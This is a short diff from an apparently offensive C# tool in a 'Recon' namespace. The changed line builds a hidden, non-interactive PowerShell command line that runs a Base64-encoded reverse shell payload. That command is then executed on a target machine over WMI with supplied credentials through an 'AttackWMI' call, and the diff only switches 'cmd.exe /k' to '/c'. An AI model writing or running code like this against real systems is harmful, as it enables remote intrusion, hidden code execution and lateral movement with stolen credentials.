@@ -685,7 +685,7 @@ namespace Recon
                         byte[] encoded = Encoding.Unicode.GetBytes(reverseShell);
                         string obfuscatedCommand = Convert.ToBase64String(encoded);
 
-                        string commandLine = "cmd.exe /k powershell -windowstyle hidden -noprofile -noninteractive -encodedcommand " + obfuscatedCommand;
+                        string commandLine = "cmd.exe /c powershell -windowstyle hidden -noprofile -noninteractive -encodedcommand " + obfuscatedCommand;
                         AttackWMI(Username, Password, domainURL, targetIP, commandLine);
                     }
                 }
